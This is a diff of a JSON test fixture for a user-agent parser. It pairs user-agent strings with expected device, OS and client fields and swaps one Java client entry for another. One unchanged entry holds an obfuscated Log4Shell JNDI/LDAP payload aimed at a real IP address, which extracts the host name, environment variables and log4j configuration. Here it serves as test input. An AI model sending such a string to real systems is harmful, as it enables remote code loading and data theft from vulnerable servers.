@@ -421,48 +421,6 @@
   },
   {
     "headers": {
-      "user-agent": "unirest-java/3.1.00"
-    },
-    "device": {
-      "architecture": null,
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "dualOrientation": null,
-      "simCount": null,
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "bits": null
-    },
-    "os": {
-      "name": "JavaOS",
-      "marketingName": "JavaOS",
-      "version": null,
-      "manufacturer": "sun-microsystems"
-    },
-    "client": {
-      "name": "Java Standard Library",
-      "version": "3.1.00",
-      "manufacturer": "oracle",
-      "type": "library",
-      "isbot": false
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
       "user-agent": "${${:-j}${:-n}${:-d}${:-i}:${:-l}${:-d}${:-a}${:-p}://143.198.244.73:80/dn=gAAAAABjIZ-qMrQPme0yvnOBZK85pG7Izw-O8ZzMZ8A3fwRGe9XynegJNcrqSMsZ48bvAuuqsd2X_WBemCjORFNsnZTga28dbyBLelcHH_-_JHuEQxk2MBWfKzNeNI1AkYAoler3oLmTrEslKYUtjCu3oon8DBV-94oR1yjKlEZfJWTLqj3NRdxNhSp7rTK-MGy0hZwu00-LPnn5Pva2nyqwVMEp-ouJfoZhdOlkrsXCW4uRj2A5ZheUUEEGcZl2NamNKGQrKzpFAB6RN96sjhecedpeA3G5FgbDvUSx2Pnu_ICr-Df9oiH_S1-16OCA-MjUJZ5zJg19kkhHcOZeL4ErfBVIo8ZAQSeC-kXwYOfedWu9BrO2DO_jqmzQY4S0pvnohLE6udD0AeqDQ3wmy7kmH7LF2xK_ILxFmGwr0Ic5iFHmpMUakSq1Ghwncm5G8aW_d6uDG-zr6DPn2wdKdIvYYPyJ-qIPJfOb87cQYW4i7Nz1rrOjmDgKsqpgIFNElCj9PJ6sRXiEmTzrsY2itkQls0F1PjacbZlOXViNiSCGGhAPFEKsWlfF3twhi0qzrTX4MGAqiTMWywENRlTGJL6GGxpDdqdcu9kPMWbL38-1VjXFPDqnZ_X3ub8XUnrMLu3068e_6jdhsEXgLAbO7jeP0JdDGHMkRv64Xj3l4LCiB7xtVAOrxwy6l9W_h9NPD1rLtilM_cBb2NBr2HXkoD7Yge4rqmFeRyZP3uiCcFbhzdqSABDUth8r3XUSNYzSIYhexvgyWyBAMHPBSYjKvlgxm_z1LiowLPvCHmwvlRLjUGYjDx-0-oqOU26t8RXtiNFTpntCWyjOw5umQqW0z_ARJ26GQLTZAsXPNT9CMR1lxYr1WMzFPXIsttgDunS4lyEngbYv0ML3Cx2jMGIcMo4N1cWnpjdaRAgDlAASQ9Hr3t9Pf6FTMRtfCc3JAARrJibm3awsisdTmRrljy9x6bm3LGccPM4ZibJz2UQybiKTMreSC5oXoJ5pWgs9ImYiyRgQPmZXDaqd,cn='${hostName}',ou='${java:os}',ca1='${ENV:HOME:-Non}',ca2='${log4j:configParentLocation}',wca2='${ENV:HOMEPATH:-Non}'}"
     },
     "device": {
@@ -535,6 +493,48 @@
     "client": {
       "name": "Java Standard Library",
       "version": "17.0.1",
+      "manufacturer": "oracle",
+      "type": "library",
+      "isbot": false
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "Java/16"
+    },
+    "device": {
+      "architecture": null,
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "dualOrientation": null,
+      "simCount": null,
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "bits": null
+    },
+    "os": {
+      "name": "JavaOS",
+      "marketingName": "JavaOS",
+      "version": null,
+      "manufacturer": "sun-microsystems"
+    },
+    "client": {
+      "name": "Java Standard Library",
+      "version": "16.0.0",
       "manufacturer": "oracle",
       "type": "library",
       "isbot": false
